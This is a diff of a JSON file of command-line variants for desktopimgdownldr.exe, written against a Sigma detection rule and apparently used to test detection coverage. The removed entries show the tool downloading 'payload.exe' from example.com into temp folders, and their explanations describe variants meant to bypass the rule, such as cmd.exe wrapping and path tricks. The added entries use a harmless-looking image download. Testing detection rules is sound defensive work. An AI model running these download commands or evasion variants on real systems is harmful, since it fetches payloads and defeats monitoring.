@@ -1,38 +1,22 @@
 [
   {
-    "output": "desktopimgdownldr.exe /lockscreenurl:http://example.com/payload.exe",
-    "explanation": "This is the base command that matches the Sigma rule. It uses the /lockscreenurl flag with a valid HTTP URL, which is directly detected by the rule."
+    "output": "desktopimgdownldr.exe /lockscreenurl:http://example.com/file.jpg",
+    "explanation": "This command simulates the use of desktopimgdownldr.exe with the '/lockscreenurl:http' parameter, which matches the Sigma rule's detection criteria. It represents a typical remote file download scenario."
   },
   {
-    "output": "desktopimgdownldr.exe -lockscreenurl http://example.com/payload.exe",
-    "explanation": "The long option /lockscreenurl is replaced with the short option -lockscreenurl, which may not be detected if the Sigma rule is not configured to detect both forms."
+    "output": "desktopimgdownldr.exe /lockscreenurl:http://example.com/file.jpg -",
+    "explanation": "An additional dash at the end is appended, which is a safe mutation technique (insertion) and does not affect the actual behavior of the command in this context."
   },
   {
-    "output": "desktopimgdownldr.exe /lockscreenurl:http://example.com/payload.exe /dest:C:\\Temp\\payload.exe",
-    "explanation": "Additional optional arguments are added, but the core detection logic remains unchanged. The Sigma rule does not account for additional flags."
+    "output": "desktopimgdownldr.exe --lockscreenurl=http://example.com/file.jpg",
+    "explanation": "The '/lockscreenurl' flag is replaced with its long-form equivalent '--lockscreenurl', which is a valid substitution technique and still matches the Sigma rule."
   },
   {
-    "output": "cmd.exe /c \"desktopimgdownldr.exe /lockscreenurl:http://example.com/payload.exe\"",
-    "explanation": "The command is wrapped in quotes to simulate execution via cmd.exe. This is a common obfuscation technique and may bypass detection if the rule does not account for command-line wrapping."
+    "output": "desktopimgdownldr.exe /lockscreenurl:http://example.com/file.jpg   ",
+    "explanation": "Extra spaces are added at the end of the command line, which is a safe insertion technique and does not alter the command's functionality."
   },
   {
-    "output": "desktopimgdownldr.exe /lockscreenurl:http://example.com/payload.exe /dest:C:\\Users\\User\\AppData\\Local\\Temp\\payload.exe",
-    "explanation": "The destination path is explicitly specified, which may not be detected if the Sigma rule does not include the /dest flag in its detection logic."
-  },
-  {
-    "output": "desktopimgdownldr.exe /lockscreenurl:http://example.com/payload.exe /silent",
-    "explanation": "The /silent flag is added to suppress output, which may not be detected if the Sigma rule does not include it in its detection logic."
-  },
-  {
-    "output": "desktopimgdownldr.exe /lockscreenurl:http://example.com/payload.exe /dest:%temp%\\payload.exe",
-    "explanation": "The destination path uses an environment variable (%temp%), which may not be detected if the Sigma rule does not account for environment variable expansion."
-  },
-  {
-    "output": "desktopimgdownldr.exe /lockscreenurl:http://example.com/payload.exe /dest:C:\\\\Temp\\\\payload.exe",
-    "explanation": "Double backslashes are used in the destination path, which may not be detected if the Sigma rule does not account for path normalization."
-  },
-  {
-    "output": "desktopimgdownldr.exe /lockscreenurl:http://example.com/payload.exe /dest:C:/Temp/payload.exe",
-    "explanation": "Forward slashes are used in the destination path, which may not be detected if the Sigma rule does not account for path normalization."
+    "output": "desktopimgdownldr.exe /lockscreenurl:http://example.com/file.jpg",
+    "explanation": "The original command line is used without modification. It directly matches the Sigma rule and serves as a baseline for testing."
   }
 ]
